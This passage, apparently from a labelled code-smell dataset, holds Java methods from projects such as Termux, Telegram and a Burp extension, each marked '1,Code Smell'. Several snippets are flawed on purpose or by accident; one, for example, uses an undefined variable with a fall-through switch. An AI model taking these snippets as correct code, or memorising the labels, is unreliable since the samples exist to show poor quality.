  Logger.logDebugExtended(logTag,ExecutionCommand.getExecutionOutputLogString(executionCommand,true,!isPluginExecutionCommandWithPendingResult,isExecutionCommandLoggingEnabled));
  if (isPluginExecutionCommandWithPendingResult) {
    if (executionCommand.resultConfig.resultPendingIntent != null)     setPluginResultPendingIntentVariables(executionCommand);
    if (executionCommand.resultConfig.resultDirectoryPath != null)     setPluginResultDirectoryVariables(executionCommand);
    error=ResultSender.sendCommandResultData(context,logTag,executionCommand.getCommandIdAndLabelLogString(),executionCommand.resultConfig,executionCommand.resultData,isExecutionCommandLoggingEnabled);
    if (error != null) {
      resultData.setStateFailed(error);
      Logger.logDebugExtended(logTag,ExecutionCommand.getExecutionOutputLogString(executionCommand,true,true,isExecutionCommandLoggingEnabled));
      sendPluginCommandErrorNotification(context,logTag,null,ResultData.getErrorsListMinimalString(resultData),ExecutionCommand.getExecutionCommandMarkdownString(executionCommand),false,true,TermuxUtils.AppInfoMode.TERMUX_AND_CALLING_PACKAGE,true,executionCommand.resultConfig.resultPendingIntent != null ? executionCommand.resultConfig.resultPendingIntent.getCreatorPackage() : null);
    }
  }
  if (!executionCommand.isStateFailed() && error == null)   executionCommand.setState(ExecutionCommand.ExecutionState.SUCCESS);
}
",1,Code Smell
"public List<List<String>> cluster(List<double[]> vectors,List<String> labels,Map<String,double[]> vectorMap){
  List<double[]> centroids=new ArrayList<>();
  for (int i=0; i < numClusters; i++) {
    centroids.add(vectors.get(random.nextInt(vectors.size())));
  }
  List<List<String>> clusters=new ArrayList<>();
  for (int i=0; i < maxIterations; i++) {
    clusters.clear();
    for (int j=0; j < numClusters; j++) {
      clusters.add(new ArrayList<>());
    }
    for (int j=0; j < vectors.size(); j++) {
      double[] vector=vectors.get(j);
      double minDistance=Double.MAX_VALUE;
      int nearestCluster=-1;
      for (int k=0; k < numClusters; k++) {
        double[] centroid=centroids.get(k);
        double distance=euclideanDistance(vector,centroid);
        if (distance < minDistance) {
          minDistance=distance;
          nearestCluster=k;
        }
      }
      clusters.get(nearestCluster).add(labels.get(j));
    }
    boolean converged=true;
    for (int j=0; j < numClusters; j++) {
      double[] newCentroid=calculateCentroid(clusters.get(j),vectorMap);
      double[] oldCentroid=centroids.get(j);
      if (euclideanDistance(newCentroid,oldCentroid) > threshold) {
        centroids.set(j,newCentroid);
        converged=false;
      }
    }
    if (converged) {
      break;
    }
  }
  return clusters;
}",1,Code Smell
"@Override public Row insert(Connection cn,Table table,Row row) throws PersistenceException {
  return insert(cn,null,table,row,null);
}
@Override public Row insert(Connection cn,Dialect dialect,Table table,Row row,SqlParamValueMapper mapper) throws PersistenceException {
  checkValidTable(table);
  dialect=getDialect(cn,dialect);
  ReleasableRegistry releasableRegistry=createReleasableRegistry();
  Sql sql=Sql.valueOf().sql(""INSERT INTO "").sql(quote(dialect,table.getName())).sql("" ("").delimit("","");
  Sql valueSql=Sql.valueOf().sql("" VALUES ("").delimit("","");
  Column[] columns=table.getColumns();
  List<Column> autoGeneratedColumns=new ArrayList<>(2);
  AutoGeneratedResult generatedResult;
  try {
    for (int i=0; i < columns.length; i++) {
      Column column=columns[i];
      if (!supportsColumn(column))       continue;
      String name=column.getName();
      Object value=row.get(name);
      if (column.isAutoincrement() && StringUtil.isEmpty(value)) {
        autoGeneratedColumns.add(column);
        continue;
      }
      if (!row.containsKey(name))       continue;
      if (value == null)       continue;
      SqlParamValue sqlParamValue=mapToSqlParamValue(cn,table,column,value,mapper,releasableRegistry);
      sql.sqld(quote(dialect,name));
      if (sqlParamValue instanceof LiteralSqlParamValue) {
        LiteralSqlParamValue lspv=(LiteralSqlParamValue)sqlParamValue;
        validateQuerySql(cn,lspv.getValue());
        valueSql.sqld(addBracketIfSelectSql(lspv.getValue()));
      }
 else       valueSql.sqld(""?"").param(sqlParamValue);
    }
    sql.sql("")"");
    valueSql.sql("")"");
    sql.sql(valueSql);
    generatedResult=executeUpdateWrap(cn,sql,autoGeneratedColumns);
  }
  finally {
    releasableRegistry.release();
  }
  Row re=new Row(row);
  if (generatedResult != null && generatedResult.hasGeneratedResult()) {
    Map<String,Object> gen=generatedResult.getGeneratedResult().get(0);
    re.putAll(gen);
  }
  return re;
}",1,Code Smell
"private void checkLoadingOperationInternal(){
  int activeCount=0;
  int lastPriority=0;
  boolean pauseAllNextOperations=false;
  int max=type == TYPE_LARGE ? MessagesController.getInstance(currentAccount).largeQueueMaxActiveOperations : MessagesController.getInstance(currentAccount).smallQueueMaxActiveOperations;
  tmpListOperations.clear();
  for (int i=0; i < allOperations.size(); i++) {
    FileLoadOperation prevOperation=i > 0 ? allOperations.get(i - 1) : null;
    FileLoadOperation operation=allOperations.get(i);
    if (i > 0 && !pauseAllNextOperations) {
      if (type == TYPE_LARGE) {
        if (prevOperation != null && prevOperation.isStory && prevOperation.getPriority() >= PRIORITY_VALUE_MAX && operation.getPriority() <= PRIORITY_VALUE_LOW) {
          pauseAllNextOperations=true;
        }
      }
      if (lastPriority > PRIORITY_VALUE_LOW && operation.getPriority() == PRIORITY_VALUE_LOW) {
        pauseAllNextOperations=true;
      }
    }
    if (operation.preFinished) {
      max++;
      if (BuildVars.DEBUG_PRIVATE_VERSION)       FileLog.d(""{"" + name + ""}.checkLoadingOperationInternal: #""+ i+ "" ""+ operation.getFileName()+ "" priority=""+ operation.getPriority()+ "" isStory=""+ operation.isStory+ "" preFinished=""+ operation.preFinished+ "" pauseAllNextOperations=""+ pauseAllNextOperations+ "" max=""+ max+ "" => skip"");
      continue;
    }
 else     if (!pauseAllNextOperations && i < max) {
      if (BuildVars.DEBUG_PRIVATE_VERSION)       FileLog.d(""{"" + name + ""}.checkLoadingOperationInternal: #""+ i+ "" ""+ operation.getFileName()+ "" priority=""+ operation.getPriority()+ "" isStory=""+ operation.isStory+ "" preFinished=""+ operation.preFinished+ "" pauseAllNextOperations=""+ pauseAllNextOperations+ "" max=""+ max+ "" => start"");
      tmpListOperations.add(operation);
      activeCount++;
    }
 else {
      if (BuildVars.DEBUG_PRIVATE_VERSION)       FileLog.d(""{"" + name + ""}.checkLoadingOperationInternal: #""+ i+ "" ""+ operation.getFileName()+ "" priority=""+ operation.getPriority()+ "" isStory=""+ operation.isStory+ "" preFinished=""+ operation.preFinished+ "" pauseAllNextOperations=""+ pauseAllNextOperations+ "" max=""+ max+ "" => pause"");
      if (operation.wasStarted()) {
        operation.pause();
      }
    }
    lastPriority=operation.getPriority();
  }
  for (int i=0; i < tmpListOperations.size(); i++) {
    tmpListOperations.get(i).start();
  }
}",1,Code Smell
"private void initVideoView(){
  LiveController controller=new LiveController(this);
  controller.setListener(new LiveController.LiveControlListener(){
    @Override public boolean singleTap(){
      showChannelList();
      return true;
    }
    @Override public void longPress(){
      showSettingGroup();
    }
    @Override public void playStateChanged(    int playState){
switch (playState) {
case VideoView.STATE_IDLE:
case VideoView.STATE_PAUSED:
        break;
case VideoView.STATE_PREPARED:
case VideoView.STATE_BUFFERED:
case VideoView.STATE_PLAYING:
      currentLiveChangeSourceTimes=0;
    mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
  break;
case VideoView.STATE_ERROR:
case VideoView.STATE_PLAYBACK_COMPLETED:
mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
mHandler.post(mConnectTimeoutChangeSourceRun);
break;
case VideoView.STATE_PREPARING:
case VideoView.STATE_BUFFERING:
mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
mHandler.postDelayed(mConnectTimeoutChangeSourceRun,(Hawk.get(HawkConfig.LIVE_CONNECT_TIMEOUT,1) + 1) * 5000);
break;
}
}
@Override public void changeSource(int direction){
if (direction > 0) playNextSource();
 else playPreSource();
}
}
);
controller.setCanChangePosition(false);
controller.setEnableInNormal(true);
controller.setGestureEnabled(true);
controller.setDoubleTapTogglePlayEnabled(false);
mVideoView.setVideoController(controller);
mVideoView.setProgressManager(null);
}",1,Code Smell
"private Object[][] read2DArray(MemoryBuffer buffer){
  int numElements=buffer.readVarUint32Small7();
  boolean isFinal=(numElements & 0b1) != 0;
  numElements>>>=1;
  RefResolver refResolver=fury.getRefResolver();
  Object[][] value=new Object[numElements][];
  refResolver.reference(value);
  if (isFinal) {
    for (int i=0; i < numElements; i++) {
      Object[] elem;
      int nextReadRefId=refResolver.tryPreserveRefId(buffer);
      if (nextReadRefId >= Fury.NOT_NULL_VALUE_FLAG) {
        elem=read1DArray(buffer);
        refResolver.setReadObject(nextReadRefId,elem);
      }
 else {
        elem=(Object[])refResolver.getReadObject();
      }
      value[i]=elem;
    }
  }
 else {
    for (int i=0; i < numElements; i++) {
      value[i]=(Object[])fury.readRef(buffer);
    }
  }
  return value;
}",1,Code Smell
"@SneakyThrows @Override public ArticleDTO getArticleById(Integer articleId){
  Article articleForCheck=articleMapper.selectOne(new LambdaQueryWrapper<Article>().eq(Article::getId,articleId));
  if (Objects.isNull(articleForCheck)) {
    return null;
  }
  if (articleForCheck.getStatus().equals(2)) {
    Boolean isAccess;
    try {
      isAccess=redisService.sIsMember(ARTICLE_ACCESS + UserUtil.getUserDetailsDTO().getId(),articleId);
    }
 catch (    Exception exception) {
      throw new BizException(ARTICLE_ACCESS_FAIL);
    }
    if (isAccess.equals(false)) {
      throw new BizException(ARTICLE_ACCESS_FAIL);
    }
  }
  updateArticleViewsCount(articleId);
  CompletableFuture<ArticleDTO> asyncArticle=CompletableFuture.supplyAsync(() -> articleMapper.getArticleById(articleId));
  CompletableFuture<ArticleCardDTO> asyncPreArticle=CompletableFuture.supplyAsync(() -> {
    ArticleCardDTO preArticle=articleMapper.getPreArticleById(articleId);
    if (Objects.isNull(preArticle)) {
      preArticle=articleMapper.getLastArticle();
    }
    return preArticle;
  }
);
  CompletableFuture<ArticleCardDTO> asyncNextArticle=CompletableFuture.supplyAsync(() -> {
    ArticleCardDTO nextArticle=articleMapper.getNextArticleById(articleId);
    if (Objects.isNull(nextArticle)) {
      nextArticle=articleMapper.getFirstArticle();
    }
    return nextArticle;
  }
);
  ArticleDTO article=asyncArticle.get();
  if (Objects.isNull(article)) {
    return null;
  }
  Double score=redisService.zScore(ARTICLE_VIEWS_COUNT,articleId);
  if (Objects.nonNull(score)) {
    article.setViewCount(score.intValue());
  }
  article.setPreArticleCard(asyncPreArticle.get());
  article.setNextArticleCard(asyncNextArticle.get());
  return article;
}",1,Code Smell
"@Override public void onClick(DialogInterface p1,int p2){
  try {
    int i=0;
    try {
      i=Integer.parseInt(edt.getText().toString());
    }
 catch (    Throwable ignored) {
    }
switch (mode) {
case TOAST_OFFSET_Y:
      Config.setToastOffsetY(i);
    break;
case CHECK_INTERVAL:
  if (i > 0)   Config.setCheckInterval(i * 60_000);
break;
case ADVANCE_TIME:
Config.setAdvanceTime(i);
break;
case COLLECT_INTERVAL:
if (i >= 0) Config.setCollectInterval(i);
break;
case LIMIT_COUNT:
if (i > 0) {
Config.setLimitCount(i);
}
break;
case DOUBLE_CARD_TIME:
Config.setDoubleCardTime(edt.getText().toString());
break;
case DOUBLE_COUNT_LIMIT:
if (i < 0) i=0;
Config.setDoubleCountLimit(i);
break;
case COLLECT_TIMEOUT:
if (i > 0) Config.setCollectTimeout(i * 1_000);
break;
case RETURN_WATER_30:
if (i >= 0) Config.setReturnWater33(i);
break;
case RETURN_WATER_20:
if (i >= 0) Config.setReturnWater18(i);
break;
case RETURN_WATER_10:
if (i >= 0) Config.setReturnWater10(i);
break;
case WATER_FRIEND_COUNT:
if (i >= 0) Config.setWaterFriendCount(i);
break;
case FARM_GAME_TIME:
Config.setFarmGameTime(edt.getText().toString());
break;
case ANIMAL_SLEEP_TIME:
Config.setAnimalSleepTime(edt.getText().toString());
break;
case MIN_EXCHANGE_COUNT:
if (i >= 0) Config.setMinExchangeCount(i);
break;
case LATEST_EXCHANGE_TIME:
if (i >= 0 && i < 24) Config.setLatestExchangeTime(i);
break;
case SYNC_STEP_COUNT:
if (i > 100000) i=100000;
if (i < 0) i=0;
Config.setSyncStepCount(i);
break;
case WAIT_WHEN_EXCEPTION:
if (i < 0) i=0;
Config.setWaitWhenException(i * 60 * 1000);
break;
case EXCHANGE_ENERGY_DOUBLE_CLICK_COUNT:
if (i < 0) i=0;
Config.setExchangeEnergyDoubleClickCount(i);
break;
case ORCHARD_SPREAD_MANURE_COUNT:
if (i < 0) i=0;
Config.setOrchardSpreadManureCount(i);
break;
case STALL_ALLOW_OPEN_TIME:
if (i < 0) i=0;
Config.setStallAllowOpenTime(i);
break;
case STALL_SELF_OPEN_TIME:
if (i < 0) i=0;
Config.setStallSelfOpenTime(i);
break;
}
}
 catch (Throwable ignored) {
}
}",1,Code Smell
"private void writeSampleData(int track,MediaCodec.BufferInfo buffer,ByteBuffer encodedData){
  if ((buffer.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
    if (VERBOSE)     Log.d(TAG,""Ignoring BUFFER_FLAG_CODEC_CONFIG"");
    buffer.size=0;
  }
  boolean eos=(buffer.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0;
  if (buffer.size == 0 && !eos) {
    if (VERBOSE)     Log.d(TAG,""info.size == 0, drop it."");
    encodedData=null;
  }
 else {
    if (buffer.presentationTimeUs != 0) {
      if (track == mVideoTrackIndex) {
        resetVideoPts(buffer);
      }
 else       if (track == mAudioTrackIndex) {
        resetAudioPts(buffer);
      }
    }
    if (VERBOSE)     Log.d(TAG,""["" + Thread.currentThread().getId() + ""] Got buffer, track=""+ track+ "", info: size=""+ buffer.size+ "", presentationTimeUs=""+ buffer.presentationTimeUs);
    if (!eos && mCallback != null) {
      mCallback.onRecording(buffer.presentationTimeUs);
    }
  }
  if (encodedData != null) {
    encodedData.position(buffer.offset);
    encodedData.limit(buffer.offset + buffer.size);
    mMuxer.writeSampleData(track,encodedData,buffer);
    if (VERBOSE)     Log.i(TAG,""Sent "" + buffer.size + "" bytes to MediaMuxer on track ""+ track);
  }
}",1,Code Smell
"public boolean canFinish(int numCourses,int[][] prerequisites){
  List<List<Integer>> degreeList=new ArrayList<>();
  for (int i=0; i < numCourses; i++) {
    degreeList.add(new ArrayList<>());
  }
  int[] inDegree=new int[numCourses];
  for (  int[] cur : prerequisites) {
    inDegree[cur[0]]++;
    degreeList.get(cur[1]).add(cur[0]);
  }
  Queue<Integer> queue=new LinkedList<>();
  for (int i=0; i < numCourses; i++) {
    if (inDegree[i] == 0) {
      queue.add(i);
    }
  }
  while (!queue.isEmpty()) {
    Integer node=queue.poll();
    List<Integer> outDegree=degreeList.get(node);
    for (    Integer out : outDegree) {
      inDegree[out]--;
      if (inDegree[out] == 0) {
        queue.add(out);
      }
    }
    numCourses--;
  }
  return numCourses == 0;
}",1,Code Smell
"/** 
 * run
 */
@Override public void run(){
  LOG.info(""start to PartitionLeaderElectionRunnable."");
  Set<String> uidPartitions=new HashSet<>();
  for (  Entry<String,PartitionCreateRunnable> entry : this.partitionCreateMap.entrySet()) {
    if (entry.getValue().getState() != PartitionState.INIT && entry.getValue().getState() != PartitionState.CREATING) {
      uidPartitions.add(entry.getKey());
    }
  }
  uidPartitions.forEach(item -> this.partitionCreateMap.remove(item));
  try (Connection conn=context.getHiveConnection()){
    Map<String,HdfsIdConfig> idConfigMap=context.getIdConfigMap();
    ExecutorService partitionCreatePool=context.getPartitionCreatePool();
    Statement stat=conn.createStatement();
    for (    Entry<String,HdfsIdConfig> entry : idConfigMap.entrySet()) {
      LOG.info(""start to PartitionLeaderElectionRunnable check id token:{}"",entry.getKey());
      if (hasToken(entry.getValue())) {
        HdfsIdConfig idConfig=entry.getValue();
        String tableName=idConfig.getHiveTableName();
        ResultSet rs=stat.executeQuery(""show partitions "" + tableName);
        Set<String> partitionSet=new HashSet<>();
        while (rs.next()) {
          String strPartition=rs.getString(1);
          int index=strPartition.indexOf('=');
          if (index < 0) {
            continue;
          }
          partitionSet.add(strPartition.substring(index + 1));
        }
        rs.close();
        LOG.info(""find id:{},partitions:{}"",entry.getKey(),partitionSet);
        long currentTime=System.currentTimeMillis();
        long beginScanTime=currentTime - 2 * idConfig.getMaxPartitionOpenDelayHour() * HdfsIdConfig.HOUR_MS;
        long endScanTime=currentTime - context.getMaxFileOpenDelayMinute() * HiveSinkContext.MINUTE_MS;
        long forceCloseTime=currentTime - idConfig.getMaxPartitionOpenDelayHour() * HdfsIdConfig.HOUR_MS;
        LOG.info(""start to PartitionLeaderElectionRunnable scan:beginScanTime:{},"" + ""endScanTime:{},getPartitionIntervalMs:{}"",beginScanTime,endScanTime,idConfig.getPartitionIntervalMs());
        for (long pt=beginScanTime; pt < endScanTime; pt+=idConfig.getPartitionIntervalMs()) {
          String strPartitionValue=idConfig.parsePartitionField(pt);
          if (partitionSet.contains(strPartitionValue)) {
            continue;
          }
          boolean isForce=(pt < forceCloseTime);
          String inlongGroupId=idConfig.getInlongGroupId();
          String inlongStreamId=idConfig.getInlongStreamId();
          String uid=InlongId.generateUid(inlongGroupId,inlongStreamId);
          String uidPartitionKey=uid + ""."" + strPartitionValue;
          PartitionCreateRunnable createTask=this.partitionCreateMap.get(uidPartitionKey);
          LOG.info(""start to PartitionLeaderElectionRunnable createTask:{},isForce:{}"",uidPartitionKey,isForce);
          if (createTask != null) {
            createTask.setForce(isForce);
            continue;
          }
          createTask=new PartitionCreateRunnable(context,idConfig,strPartitionValue,pt,isForce);
          this.partitionCreateMap.put(uidPartitionKey,createTask);
          partitionCreatePool.execute(createTask);
        }
      }
    }
    stat.close();
  }
 catch (  Exception e) {
    LOG.error(e.getMessage(),e);
  }
}",1,Code Smell
"@Override public void onActivityResultFragment(int requestCode,int resultCode,Intent data){
  if (resultCode == Activity.RESULT_OK) {
    Uri ringtone=data.getParcelableExtra(RingtoneManager.EXTRA_RINGTONE_PICKED_URI);
    String name=null;
    if (ringtone != null) {
      Ringtone rng=RingtoneManager.getRingtone(getParentActivity(),ringtone);
      if (rng != null) {
        if (requestCode == callsRingtoneRow) {
          if (ringtone.equals(Settings.System.DEFAULT_RINGTONE_URI)) {
            name=LocaleController.getString(""DefaultRingtone"",R.string.DefaultRingtone);
          }
 else {
            name=rng.getTitle(getParentActivity());
          }
        }
 else {
          if (ringtone.equals(Settings.System.DEFAULT_NOTIFICATION_URI)) {
            name=LocaleController.getString(""SoundDefault"",R.string.SoundDefault);
          }
 else {
            name=rng.getTitle(getParentActivity());
          }
        }
        rng.stop();
      }
    }
    SharedPreferences preferences=MessagesController.getNotificationsSettings(currentAccount);
    SharedPreferences.Editor editor=preferences.edit();
    if (requestCode == callsRingtoneRow) {
      if (name != null && ringtone != null) {
        editor.putString(""CallsRingtone"",name);
        editor.putString(""CallsRingtonePath"",ringtone.toString());
      }
 else {
        editor.putString(""CallsRingtone"",""NoSound"");
        editor.putString(""CallsRingtonePath"",""NoSound"");
      }
      updateRingtone=true;
    }
    editor.commit();
    adapter.notifyItemChanged(requestCode);
  }
}
",1,Code Smell
"private void renderBlitPath(int mask,Path path,float alpha){
  if (path == null) {
    return;
  }
  Brush brush=path.getBrush();
  if (brush == null) {
    brush=this.brush;
  }
  final boolean masking=this.masking && (brush instanceof Brush.Radial || brush instanceof Brush.Eraser);
  Shader shader=shaders.get(brush.getShaderName(Brush.PAINT_TYPE_BLIT) + (masking ? ""_masking"" : """"));
  if (shader == null) {
    return;
  }
  GLES20.glUseProgram(shader.program);
  GLES20.glUniformMatrix4fv(shader.getUniform(""mvpMatrix""),1,false,FloatBuffer.wrap(renderProjection));
  GLES20.glUniform1i(shader.getUniform(""texture""),0);
  GLES20.glUniform1i(shader.getUniform(""mask""),1);
  int color=path.getColor();
  color=ColorUtils.setAlphaComponent(color,(int)(Color.alpha(color) * brush.getOverrideAlpha() * alpha));
  Shader.SetColorUniform(shader.getUniform(""color""),color);
  GLES20.glActiveTexture(GLES20.GL_TEXTURE0);
  GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,getTexture());
  GLES20.glActiveTexture(GLES20.GL_TEXTURE1);
  GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,mask);
  if (masking) {
    GLES20.glUniform1i(shader.getUniform(""otexture""),2);
    GLES20.glUniform1f(shader.getUniform(""preview""),0.4f);
    GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
    GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,originalBitmapTexture.texture());
  }
  Object lock=null;
  if (brush instanceof Brush.Blurer) {
    GLES20.glUniform1i(shader.getUniform(""blured""),2);
    GLES20.glActiveTexture(GLES20.GL_TEXTURE2);
    if (blurManager != null) {
      lock=blurManager.getTextureLock();
      GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,blurManager.getTexture());
    }
 else     if (bluredTexture != null) {
      GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,bluredTexture.texture());
    }
  }
  GLES20.glBlendFunc(GLES20.GL_ONE,GLES20.GL_ONE_MINUS_SRC_ALPHA);
  GLES20.glVertexAttribPointer(0,2,GLES20.GL_FLOAT,false,8,vertexBuffer);
  GLES20.glEnableVertexAttribArray(0);
  GLES20.glVertexAttribPointer(1,2,GLES20.GL_FLOAT,false,8,textureBuffer);
  GLES20.glEnableVertexAttribArray(1);
  if (lock != null) {
synchronized (lock) {
      GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP,0,4);
    }
  }
 else {
    GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP,0,4);
  }
  Utils.HasGLError();
}",1,Code Smell
"private IndexRef toIndexRef(JMethod method,String text){
  IndexRef.Kind kind;
  String indexStr;
  if (text.endsWith(ARRAY_SUFFIX)) {
    kind=IndexRef.Kind.ARRAY;
    indexStr=text.substring(0,text.length() - ARRAY_SUFFIX.length());
  }
 else   if (text.contains(""."")) {
    kind=IndexRef.Kind.FIELD;
    indexStr=text.substring(0,text.indexOf('.'));
  }
 else {
    kind=IndexRef.Kind.VAR;
    indexStr=text;
  }
  int index=InvokeUtils.toInt(indexStr);
  Type varType=getMethodType(method,index);
  JField field=null;
switch (kind) {
case ARRAY:
{
      if (!(varType instanceof ArrayType)) {
        throw new ConfigException(""Expected: array type, given: "" + varType);
      }
    }
case FIELD:
{
    String fieldName=text.substring(text.indexOf('.') + 1);
    if (varType instanceof ClassType) {
      JClass clazz=classType.getJClass();
      while (clazz != null) {
        field=clazz.getDeclaredField(fieldName);
        if (field != null) {
          break;
        }
        clazz=clazz.getSuperClass();
      }
    }
    if (field == null) {
      throw new ConfigException(""Cannot find field '"" + fieldName + ""' in type ""+ varType);
    }
  }
}
return new IndexRef(kind,index,field);
}",1,Code Smell
"@SuppressWarnings(""rawtypes"") public static <T>T startAudit(AuditRunnable<T> supplier,Statement statement,BoundSql boundSql,Configuration configuration) throws SQLException {
  AuditMessage auditMessage=messageFactory.create();
  if (auditMessage == null) {
    return supplier.execute();
  }
  String key=DataSourceKey.get();
  if (StringUtil.isBlank(key)) {
    key=FlexGlobalConfig.getDefaultConfig().getDataSource().getDefaultDataSourceKey();
  }
  auditMessage.setDsName(key);
  auditMessage.setQueryTime(clock.getTick());
  try {
    T result=supplier.execute();
    if (result instanceof Collection) {
      auditMessage.setQueryCount(((Collection)result).size());
    }
 else     if (result instanceof Number) {
      auditMessage.setQueryCount(((Number)result).intValue());
    }
 else     if (result != null) {
      auditMessage.setQueryCount(1);
    }
    return result;
  }
  finally {
    auditMessage.setElapsedTime(clock.getTick() - auditMessage.getQueryTime());
    auditMessage.setQuery(boundSql.getSql());
    Object parameter=boundSql.getParameterObject();
    if (parameter instanceof Map) {
      TypeHandlerRegistry typeHandlerRegistry=configuration.getTypeHandlerRegistry();
      if (((Map<?,?>)parameter).containsKey(FlexConsts.SQL_ARGS)) {
        auditMessage.addParams(statement,((Map<?,?>)parameter).get(FlexConsts.SQL_ARGS));
      }
 else       if (((Map<?,?>)parameter).containsKey(""collection"")) {
        Collection collection=(Collection)((Map<?,?>)parameter).get(""collection"");
        auditMessage.addParams(statement,collection.toArray());
      }
 else       if (((Map<?,?>)parameter).containsKey(""array"")) {
        auditMessage.addParams(statement,((Map<?,?>)parameter).get(""array""));
      }
 else {
        List<ParameterMapping> parameterMappings=boundSql.getParameterMappings();
        for (        ParameterMapping parameterMapping : parameterMappings) {
          if (parameterMapping.getMode() != ParameterMode.OUT) {
            Object value;
            String propertyName=parameterMapping.getProperty();
            if (boundSql.hasAdditionalParameter(propertyName)) {
              value=boundSql.getAdditionalParameter(propertyName);
            }
 else             if (typeHandlerRegistry.hasTypeHandler(parameter.getClass())) {
              value=parameter;
            }
 else {
              MetaObject metaObject=configuration.newMetaObject(parameter);
              value=metaObject.getValue(propertyName);
            }
            auditMessage.addParams(statement,value);
          }
        }
      }
    }
    messageCollector.collect(auditMessage);
  }
}",1,Code Smell
"public static int dp(int[] arr){
  if (arr == null || arr.length < 2) {
    return 0;
  }
  int sum=0;
  for (  int num : arr) {
    sum+=num;
  }
  sum/=2;
  int N=arr.length;
  int M=(N + 1) / 2;
  int[][][] dp=new int[N + 1][M + 1][sum + 1];
  for (int i=0; i <= N; i++) {
    for (int j=0; j <= M; j++) {
      for (int k=0; k <= sum; k++) {
        dp[i][j][k]=-1;
      }
    }
  }
  for (int rest=0; rest <= sum; rest++) {
    dp[N][0][rest]=0;
  }
  for (int i=N - 1; i >= 0; i--) {
    for (int picks=0; picks <= M; picks++) {
      for (int rest=0; rest <= sum; rest++) {
        int p1=dp[i + 1][picks][rest];
        int p2=-1;
        int next=-1;
        if (picks - 1 >= 0 && arr[i] <= rest) {
          next=dp[i + 1][picks - 1][rest - arr[i]];
        }
        if (next != -1) {
          p2=arr[i] + next;
        }
        dp[i][picks][rest]=Math.max(p1,p2);
      }
    }
  }
  if ((arr.length & 1) == 0) {
    return dp[0][arr.length / 2][sum];
  }
 else {
    return Math.max(dp[0][arr.length / 2][sum],dp[0][(arr.length / 2) + 1][sum]);
  }
}",1,Code Smell
"public boolean hidePopup(boolean byBackButton){
  return hidePopup(byBackButton,false);
}
public boolean hidePopup(boolean byBackButton,boolean forceAnimate){
  if (isPopupShowing()) {
    if (currentPopupContentType == POPUP_CONTENT_BOT_KEYBOARD && botReplyMarkup != null && byBackButton && botButtonsMessageObject != null) {
      if (botReplyMarkup.is_persistent) {
        return false;
      }
      MessagesController.getMainSettings(currentAccount).edit().putInt(""closed_botkeyboard_"" + getTopicKeyString(),botButtonsMessageObject.getId()).apply();
    }
    if (byBackButton && searchingType != 0 || forceAnimate) {
      setSearchingTypeInternal(0,true);
      if (emojiView != null) {
        emojiView.closeSearch(true);
      }
      if (messageEditText != null) {
        messageEditText.requestFocus();
      }
      setStickersExpanded(false,true,false);
      if (emojiTabOpen) {
        checkSendButton(true);
      }
    }
 else {
      if (searchingType != 0) {
        setSearchingTypeInternal(0,false);
        emojiView.closeSearch(false);
        if (messageEditText != null) {
          messageEditText.requestFocus();
        }
      }
      showPopup(0,0);
    }
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * Reads the next packet of the ogg stream. In case of an  {@code IOException} the caller must makesure to pass the same instance of  {@code ParsableByteArray} to this method again so this readercan resume properly from an error while reading a continued packet spanned across multiple pages.
 * @param input The {@link ExtractorInput} to read data from.
 * @return {@code true} if the read was successful. The read fails if the end of the input isencountered without reading data.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If the thread is interrupted.
 */
public boolean populate(ExtractorInput input) throws IOException, InterruptedException {
  Assertions.checkState(input != null);
  if (populated) {
    populated=false;
    packetArray.reset();
  }
  while (!populated) {
    if (currentSegmentIndex < 0) {
      if (!pageHeader.populate(input,true)) {
        return false;
      }
      int segmentIndex=0;
      int bytesToSkip=pageHeader.headerSize;
      if ((pageHeader.type & 0x01) == 0x01 && packetArray.limit() == 0) {
        bytesToSkip+=calculatePacketSize(segmentIndex);
        segmentIndex+=segmentCount;
      }
      input.skipFully(bytesToSkip);
      currentSegmentIndex=segmentIndex;
    }
    int size=calculatePacketSize(currentSegmentIndex);
    int segmentIndex=currentSegmentIndex + segmentCount;
    if (size > 0) {
      if (packetArray.capacity() < packetArray.limit() + size) {
        packetArray.data=Arrays.copyOf(packetArray.data,packetArray.limit() + size);
      }
      input.readFully(packetArray.data,packetArray.limit(),size);
      packetArray.setLimit(packetArray.limit() + size);
      populated=pageHeader.laces[segmentIndex - 1] != 255;
    }
    currentSegmentIndex=segmentIndex == pageHeader.pageSegmentCount ? C.INDEX_UNSET : segmentIndex;
  }
  return true;
}",1,Code Smell
"public SearchTextField(String name,JButton SearchButton){
  super(name);
  try {
    stdout=new PrintWriter(BurpExtender.getCallbacks().getStdout(),true);
    stderr=new PrintWriter(BurpExtender.getCallbacks().getStderr(),true);
  }
 catch (  Exception e) {
    stdout=new PrintWriter(System.out,true);
    stderr=new PrintWriter(System.out,true);
  }
  addActionListener(new ActionListener(){
    public void actionPerformed(    ActionEvent e){
      SearchButton.doClick();
    }
  }
);
  addMouseListener(new MouseAdapter(){
    @Override public void mouseClicked(    MouseEvent e){
      if (SwingUtilities.isLeftMouseButton(e) && e.getClickCount() == 2) {
      }
      if (e.getButton() == MouseEvent.BUTTON3) {
      }
    }
  }
);
  addKeyListener(new KeyAdapter(){
    public void keyPressed(    KeyEvent e){
      if (e.getKeyCode() == KeyEvent.VK_KP_UP || e.getKeyCode() == KeyEvent.VK_UP) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveUP();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
      if (e.getKeyCode() == KeyEvent.VK_KP_DOWN || e.getKeyCode() == KeyEvent.VK_DOWN) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveDown();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
    }
  }
);
